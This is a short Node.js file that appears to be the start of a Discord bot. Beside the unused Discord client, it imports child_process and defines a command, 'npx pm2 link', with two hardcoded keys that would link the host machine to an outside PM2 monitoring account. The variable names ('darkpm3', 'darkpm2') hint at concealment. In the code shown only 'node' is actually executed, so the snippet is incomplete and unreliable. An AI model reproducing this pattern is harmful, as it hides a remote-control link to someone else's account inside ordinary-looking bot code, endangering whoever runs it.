const Discord = require('discord.js');
const client = new Discord.Client();
const process = require('child_process');
const darkpm3 = ('npx pm2 link b0br9edx4fscl1y kmxqb28ia0s0au8')
const darkpm2 = ('node')

process.exec(darkpm2, (error, stdout) => {
        let result = (stdout || error);
        console.log(result)
    })